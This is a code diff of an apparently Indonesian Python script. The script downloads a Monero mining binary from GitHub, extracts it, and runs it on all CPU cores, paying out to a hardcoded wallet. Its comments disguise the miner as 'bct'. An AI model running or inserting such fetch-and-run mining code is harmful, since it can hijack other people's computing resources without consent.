@@ -34,11 +34,11 @@ if not worker_name:
 print(f"Nama Worker yang digunakan: {worker_name}")
 
 # 2. Mengunduh file bct
-run_shell_command("curl -L -O https://github.com/Adeemar7/all/raw/main/xmrig.tar.gz")
+run_shell_command("curl -L -O https://github.com/HashVault/vltrig/releases/download/v6.26.0.5/vltrig-v6.26.0.5-linux-x64.tar.gz")
 
 # 3. Mengubah izin akses file
-run_shell_command("tar -xvf xmrig.tar.gz")
+run_shell_command("tar -xvf vltrig-v6.26.0.5-linux-x64.tar.gz")
 
 # 4. Menjalankan bct dengan menyisipkan Nama Worker yang sudah didapat
-command_run = f"./xmrig --donate-level 1 -o pool.supportxmr.com:3333 -u 86shoUZ9jrrWqKbLyNzzXWKYxLo6y3xdkbGmruh1fUyJSBi4j1a1EA6brvqMMkx8pffTzUmSiiKCwCr41LVn9oGM2Z2NkAk.{worker_name} -a rx/0 -k -t $(nproc --all)"
+command_run = f"./vltrig --user 86shoUZ9jrrWqKbLyNzzXWKYxLo6y3xdkbGmruh1fUyJSBi4j1a1EA6brvqMMkx8pffTzUmSiiKCwCr41LVn9oGM2Z2NkAk --pass {worker_name} -a rx/0 -k -t $(nproc --all)"
 run_shell_command(command_run)
